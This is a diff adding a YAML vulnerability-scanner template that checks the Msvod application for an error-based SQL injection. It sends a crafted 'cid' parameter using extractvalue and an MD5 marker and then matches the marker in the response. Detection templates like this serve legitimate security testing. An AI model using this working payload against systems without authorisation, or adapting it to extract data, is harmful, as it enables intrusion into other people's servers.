@@ -1,0 +1,21 @@
+id: poc-yaml-msvod-sqli
+info:
+  name: Msvod SQL Injection Vulnerability
+  author: ProjectDiscoveryAI
+  severity: medium
+  tags: sql-injection
+  description: |
+    Msvod application is vulnerable to a SQL Injection attack. This template attempts to exploit the injection and check for a specific MD5-based response.
+variables:
+  r1: "{{rand_int(10000, 21000)}}"
+http:
+  - raw:
+      - |
+        GET /images/lists?cid=1%20)%20ORDER%20BY%201%20desc,extractvalue(rand(),concat(0x7c,md5({{r1}})))%20desc%20--%20a HTTP/1.1
+        Host: {{Hostname}}
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "{{substr(md5(r1), 0, 31)}}"
